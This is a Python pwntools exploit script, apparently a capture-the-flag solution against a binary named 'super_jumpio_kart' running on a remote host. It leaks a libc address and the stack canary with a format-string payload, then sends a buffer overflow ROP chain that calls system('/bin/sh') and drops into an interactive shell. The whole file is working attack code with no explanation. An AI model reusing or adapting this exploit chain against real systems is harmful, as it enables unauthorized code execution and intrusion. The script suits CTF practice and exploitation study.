from pwn import *

context.binary = binary = ELF('./super_jumpio_kart', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

#p = process()
p = remote('83.136.250.179', 52724)

# Leaks
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'Up: ', b'|%19$p|%37$p|')

p.recvuntil(b'|')
libc_leak = int(p.recvuntil(b'|')[:-1], 16)
libc.address = libc_leak - 0x2a1ca
info(f'libc @ {hex(libc.address)}')

canary = int(p.recvuntil(b'|')[:-1], 16)
info(f'canary @ {hex(canary)}')

for _ in range(7):
	p.recvuntil(b'Warning! ')
	p.sendline(p.recv(1))

p.sendline(b'y')

r = ROP(libc)
rc = b'A'*0x48
rc += p64(canary)
rc += b'B'*0x18
rc += p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)
p.send(rc)

p.clean()
success('*** SHELL ***')
p.interactive()